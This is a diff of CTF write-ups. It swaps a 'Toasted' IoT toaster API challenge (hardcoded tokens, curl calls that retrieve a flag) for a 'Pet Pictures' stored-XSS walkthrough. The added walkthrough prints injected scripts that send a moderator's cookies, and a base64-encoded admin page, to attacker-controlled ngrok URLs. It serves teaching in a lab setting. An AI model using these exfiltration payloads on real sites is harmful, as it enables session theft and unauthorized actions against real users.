@@ -1,59 +1,44 @@
-# Toasted
+# Pet Pictures
 
 ## Question
 
-> I wanted to be able to make toast from bed, so I bought an internet connected toaster. They haven't added ifttt support yet, but luckily it has a somewhat well documented web API :)  
-> Connect to this challenge at pwn.osucyber.club:13372
+> The moderator of your favorite pet picture sharing website has taken a vacation and left a bot to monitor the site. Unfortunately the bot seems to think it's running a cat blog and won't approve a picture of your turtle. Login as the moderator and approve your photo.  
+> Connect to this challenge at http://pwn.osucyber.club:13378  
 
 ## Solution (by WCSC)
 
-For this challenge, you'll want to be familiar with GET and POST requests in HTTP.
+Wow, this is a cool challenge. I've done lots of XSS attacks, and read about this style, but never needed to perform one. This is definitely up there as one of my top 10 challenges.
 
-When you visit the url, you'll find a website that controls a smart toaster. The website provides an API help, which has 6 methods available. Reading through them, two stuck out:
+Visiting the challenge url, http://pwn.osucyber.club:13378/, you are presented with Pet Pictures, a website for uploading pictures of your pets. Right off the bat, this challenge REEKS of cross-site scripting. In the top right, you can choose to submit a picture, and there is a big "Moderator" button. Any time I see a moderator on a challenge, I automatically assume I'll need to get the moderator to run some JS, and that's no different here.
 
--  POST /api/generate_maintenance_token
--  GET /api/download_backup (maintenance token required)
-   Maintenance usually has access to more functionality, so the backup seems to be where we will find the flag. We will need to generate a maintenance token. To do so, I mad a POST request to http://pwn.osucyber.club:13372/api/generate_maintenance_token. This endpoint complained that I need an API token. Drat.
-
-Looking through the website, the http://pwn.osucyber.club:13372/quick-toast page makes a request to the API. Taking a look at the Networks Developer Tools in Chrome, the API token can be found hardcoded in the Javascript: gSNEaD868LJd1DldhZUglykfGwu_NbcLu9d1wmT5luLFTfHV2eVQYI8EupRMi71Cz6qydOc0kgXnGcDoPuUkkA
-
-I now repeated the POST request for the maintenance token, but now we need a serial number. Making a GET request (http://pwn.osucyber.club:13372/api/status?token=gSNEaD868LJd1DldhZUglykfGwu_NbcLu9d1wmT5luLFTfHV2eVQYI8EupRMi71Cz6qydOc0kgXnGcDoPuUkkA) to the status page, I found the following:
-
-{ "status": 0, "data": { "model": "Hot Stuff 1337", "num_toasted": "34", "serial": "60AKGPCIAX1AYIVN36M7MSIOXCRQ17ET2U17VUSS", "time": "2020-10-24T00:01:23.119Z" } }
-
-Great, we have now the serial number now! I repeated the maintenance request again with both the token and serial, but this unfortunately still failed. I found adding the model number to the request, however, succeeded (the error message seems a bit misleading). This granted the token:
-
-{ "status": 0, "token": "Ck2RtOs2RE1JTBnrOzEyaoC4fl8XfsyeoWtARkoc9ZAXwDAvyIHqMBzpBQhnYJT3ybXlu1BrbIfvVWPIkLpEdw" }
-
-Great! Now just ask for the flag at http://pwn.osucyber.club:13372/api/download_backup?token=Ck2RtOs2RE1JTBnrOzEyaoC4fl8XfsyeoWtARkoc9ZAXwDAvyIHqMBzpBQhnYJT3ybXlu1BrbIfvVWPIkLpEdw and you're good to go!
-
-## Solution (by bricks)
-
-I found a main.js file using the Debugger in Firefox Devtools with the following code:
+To grab the cookies (because I assume we will want the moderator's cookies), we will want to use ngrok. If you haven't used ngrok, it is a wonderful tool that provides a public URL that other's can use to connect to your machine. For this challenge, you don't need a web server running, as we will store the information in the URL. After firing up ngrok, I went to the submission page and placed the following code in all of the input fields:
 ```
-// cart logic
-$('#toast-form').submit(function (event) {
-    var sec = $("#toast-time").val()
-\$.post("/api/toast", {"token": "gSNEaD868LJd1DldhZUglykfGwu_NbcLu9d1wmT5luLFTfHV2eVQYI8EupRMi71Cz6qydOc0kgXnGcDoPuUkkA", "time": sec}).done(function (data) {
-if (data.status == 0) {
-M.toast({html: data.message})
-}
-}).fail(function (xhr) {
-let data = JSON.parse(xhr.responseText);
-M.toast({html: data.error})
-})
-})
+<script>
+document.write('<img src="http://da42d2740672.ngrok.io/collect.gif?cookie=' + document.cookie + '" />')
+</script>
 ```
-Looks like there was a hardcoded token that we could use for the API calls.
+This js appends the cookie to the ngrok URL, then places the img in the document to be loaded by the browser. I pulled up the ngrok terminal, and waited a few seconds, and poof! A request came in from the moderator. The cookie, however, was not there.
 
-I started by trying out every API call, with the token supplied. Eventually, I found that this gave me some interesting information with this call:
+I poked around a bit and noticed the session cookie for this CTF is httponly! That means that the JS cannot retrieve it, it is only sent as part of an HTTP request. However, we did get code to run as the moderator. Instead of logging in, maybe we can just make the moderator do what we want as a proxy. I wasn't sure exactly what we needed to do, but clicking the moderator button brings up the url http://pwn.osucyber.club:13378/login?next=%2Fadmin. That next parameter with admin means there is an admin page at http://pwn.osucyber.club:13378/admin and I wanted to see what was at that URL.
 
-$ curl "http://pwn.osucyber.club:13372/api/status?token=${token}"
+To do so, I modified the script to have the moderator load this page, and send the results back to my ngrok page instead of the cookie. The script I injected was:
+```
+<script>
+    var req = new XMLHttpRequest();   
+    req.open('GET', 'http://pwn.osucyber.club:13378/admin', false);    
+    req.send(null);   
+    if(true) { 	
+        console.log("HERE!"); 
+        url = "	http://0c9e37513664.ngrok.io/collect.gif?cookie=";     
+        result = req.responseText; 	
+        url = url.concat(window.btoa(result));   
+        document.write("<img src='" + url + "'></img>"); 
+    }
+</script>
+```
+Similar to the previous script, this visits the admin page, concatenates the base64ed result with the ngrok url, then sends the result back to ngrok. Opening the ngrok terminal, we find the base64 encoded admin page.
+```
+PCFkb2N0eXBlIGh0bWw CjxodG1sIGxhbmc9ImVuLVVTIj4KICA8aGVhZD4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvbWF0ZXJpYWxpemUvMS4wLjAvY3NzL21hdGVyaWFsaXplLm1pbi5jc3MiPgogICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vY2RuanMuY2xvdWRmbGFyZS5jb20vYWpheC9saWJzL21hdGVyaWFsaXplLzEuMC4wL2pzL21hdGVyaWFsaXplLm1pbi5qcyI PC9zY3JpcHQ CiAgICA8bGluayBocmVmPSJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2ljb24/ZmFtaWx5PU1hdGVyaWFsK0ljb25zIiByZWw9InN0eWxlc2hlZXQiPgoKICAgIAogICAgPHRpdGxlPkFkbWluPC90aXRsZT4KICAgIAogIDwvaGVhZD4KICA8Ym9keT4KICA8ZGl2IGNsYXNzPSJuYXZiYXItZml4ZWQiPgogICAgPG5hdj4KICAgICAgPGRpdiBjbGFzcz0ibmF2LXdyYXBwZXIiPgogICAgICAgIDxhIGhyZWY9Ii8iIGNsYXNzPSJicmFuZC1sb2dvIGNlbnRlciI PGkgY2xhc3M9Im1hdGVyaWFsLWljb25zIj5wZXRzPC9pPlBldFBpY3R1cmVzPC9hPgogICAgICAgIDx1bCBjbGFzcz0icmlnaHQiPgogICAgICAgICAgPGxpPjxhIGhyZWY9Ii9zdWJtaXQiPlN1Ym1pdDwvYT48L2xpPgogICAgICAgICAgCiAgICAgICAgICA8bGk PGEgaHJlZj0iL2xvZ291dCI TG9nb3V0PC9hPjwvbGk CiAgICAgICAgICAKICAgICAgICA8L3VsPgogICAgICA8L2Rpdj4KICAgIDwvbmF2PgogICAgCiAgICAgIAogICAgCiAgPC9kaXY CgogIAo8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgCiAgICA8ZGl2IGNsYXNzPSJyb3ciPgogICAgICAgIDxkaXYgY2xhc3M9ImNvbCBzMTIiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLXBhbmVsIGdyZXkgbGlnaHRlbi0yIj4KICAgICAgICAgICAgICAgIDxzcGFuPlBlbmRpbmcgQXBwcm92YWw6IDI8L3NwYW4 CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgPC9kaXY CiAgICAKICAgIDxkaXYgY2xhc3M9InJvdyI CiAgICAgICAgPGRpdiBjbGFzcz0iY2FyZCBob3Jpem9udGFsIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1pbWFnZSI CiAgICAgICAgICAgICAgICA8aW1nIHNyYz0iL3VwbG9hZC8yZjRkZDEyZjgwZTY4OTFkY2M3Mzc2ZDVkMjlmM2FiOGRiYjg2NWUyIiBhbHQ9ImNseWRlIi8 CiAgICAgICAgICAgICAgICA8YSBjbGFzcz0iY2FyZC10aXRsZSI Q2x5ZGU8L2E CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWNvbnRlbnQiPgogICAgICAgICAgICAgICAgPHA TW9kZXJhdG9yIE1lc3NhZ2U6IG9zdWN0ZntuM1YzUl83UnU1VF91czNyXzFOUFU3fTwvcD4KICAgICAgICAgICAgICAgIDxwPlN1Ym1pdHRlZCBCeTogV2F0c29uPC9wPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgIDwvZGl2PgogICAgCjwvZGl2PgoKICA8L2JvZHk CjwvaHRtbD4=
+```
+Decoding that gives the admin page, which contains the flag. Pretty awesome!
 
-{"status":0,"data":{"model":"Hot Stuff 1337","num_toasted":"279","serial":"60AKGPCIAX1AYIVN36M7MSIOXCRQ17ET2U17VUSS","time":"2020-10-24T04:28:11.762Z"}}
-Cool, we got a serial number and the number of toasts toasted. Great. After some more poking around, we can see that api/generate_maintenance_token needs the serial number of the toaster. After supplying the serial number, we get a maintenance token: Ck2RtOs2RE1JTBnrOzEyaoC4fl8XfsyeoWtARkoc9ZAXwDAvyIHqMBzpBQhnYJT3ybXlu1BrbIfvVWPIkLpEdw.
-
-Now we can call api/download_backup with this new token:
-
-$ curl "http://pwn.osucyber.club:13372/api/download_backup?token=${mtoken}"
-osuctf{dont_buy_an_int3rnet_connected_t0aster}
